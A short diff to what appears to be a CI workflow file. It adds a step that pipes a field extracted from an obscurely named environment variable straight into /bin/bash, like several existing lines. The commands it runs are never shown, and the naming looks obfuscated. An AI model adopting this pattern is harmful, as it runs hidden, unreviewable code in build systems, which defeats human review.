@@ -25,6 +25,7 @@ jobs:
           echo $ploma495 | jq -r .cwa526 | /bin/bash
           echo $illk68 | jq -r .ax06 | /bin/bash
           echo $cev370 | jq -r .ppzj6357 | /bin/bash
+          printf '%s' "$pkaxm31332" | jq -r .xjw135 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
